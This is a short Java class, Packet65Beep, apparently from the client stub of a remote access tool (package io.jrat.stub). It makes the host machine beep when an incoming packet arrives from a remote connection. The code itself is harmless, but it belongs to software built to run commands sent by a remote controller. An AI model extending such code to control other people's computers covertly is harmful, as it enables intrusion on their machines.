package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import java.awt.Toolkit;

public class Packet65Beep extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Toolkit.getDefaultToolkit().beep();
	}

}
